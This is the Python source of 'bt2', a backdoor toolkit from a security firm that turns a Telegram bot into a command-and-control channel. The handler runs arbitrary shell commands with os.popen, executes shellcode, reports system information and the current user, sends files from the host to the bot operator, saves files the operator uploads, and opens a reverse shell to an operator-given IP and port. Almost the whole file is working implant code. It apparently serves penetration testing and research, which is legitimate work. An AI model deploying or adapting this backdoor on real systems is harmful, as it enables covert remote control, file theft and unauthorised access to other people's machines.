#!/usr/bin/python
# bt2: Blaze Telegram Backdoor Toolkit
#
# bt2 is a Python-based backdoor in form of a IM bot that uses the
# infrastructure and the feature-rich bot API provided by Telegram, slightly
# repurposing its communication platform to act as a C&C.
#
# PS: One thing to remember is a Telegram bot cannot start a conversation
# as it needs to receive a message first for further interaction.
# PS 2: Upgrade requests to the latest version (2.9.1 works fine)
#
# by Julio Cesar Fort, Wildfire Labs /// Blaze Information Security
#
# Copyright 2016, Blaze Information Security
# https://www.blazeinfosec.com

import os
import pprint
import sys
import time

from backdoorutils import *

try:
    import telepot
except ImportError:
    print "[!] Module 'telepot' not found. Please install it before continuing."
    sys.exit(-1)

API_TOKEN = 'YOUR_API_KEY_HERE'
BOTMASTER_ID = 00000000
VERBOSE = True

bot = telepot.Bot(API_TOKEN)


def handle_message(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    if VERBOSE:
        pprint.pprint(msg)

    # this conditional is used to parse commands and execute them accordingly
    if content_type == 'text':
        received_command = msg['text']

        type_command, argument_command = parse_command(received_command)

        if type_command == "command":
            proc = os.popen(argument_command)
            send_message(proc.read())

        elif type_command == "shellcode":
            response_shellcode = execute_shellcode(argument_command)
            send_message(response_shellcode)

        elif type_command == "sysinfo":
            sysinfo = get_system_info()
            send_message(sysinfo)

        elif type_command == "whoami":
            current_user = whoami()
            send_message(current_user)

        elif type_command == "upload":
            send_message(uploadfunctionality_message)

        elif type_command == "download":
            send_file(chat_id, argument_command)

        elif type_command == "reverseshell":
            ip, port = argument_command.split()
            reverse_shell(ip, port)

        # KILL NOT WORKING PROPERLY
        elif type_command == "kill":
            send_message(suicide_message)
            sys.exit(0)

        elif type_command == "help":
            send_message(help_message)

        elif type_command == "unknown":
            unknown_command = "[!] ERROR: Unknown command: %s" % argument_command
            send_message(unknown_command)

        else:
            print "[!] The program should never ever reach this point."
            return

    # this conditional is used to receive files from the client
    elif content_type == 'document':
        file_id = msg['document']['file_id']
        filename = msg['document']['file_name']
        final_filename = filename

        if not os.path.exists('./uploads'):
            try:
                os.makedirs('./uploads')
                final_filename = './uploads/' + filename
            except OSError as err:
                err_msg = "[!] ERROR: Could not create directory ./uploads. Saving in the current directory."
                send_message(err_msg)

        bot.downloadFile(file_id, final_filename)


def send_message(msg):
    try:
        bot.sendMessage(BOTMASTER_ID, msg)
    except Exception as err:
        print "[!] Error sending message: %s" % str(err)

    return


def send_file(chat_id, filename):
    try:
        fd = open(filename, "rb")
        # use sendChatAction to page the client we will send a file
        bot.sendChatAction(chat_id, 'upload_document')
        resp = bot.sendDocument(chat_id, fd)
        file_id = resp['document']['file_id']
        bot.sendDocument(chat_id, file_id)
    except IOError as err:
        err_msg = "[!] ERROR: Opening file '%s': %s" % (filename, err)
        send_message(err_msg)

    return


def main():
    try:
        '''
        Older versions of Telepot used notifyOnMessage, newer versions use
        the function message_loop. Uncomment it if using an older version.
        '''
        #bot.notifyOnMessage(handle_message)
        bot.message_loop(handle_message)
        print bot.getMe()
    except Exception as err:
        print err

    while True:
        time.sleep(10)


if __name__ == '__main__':
    main()
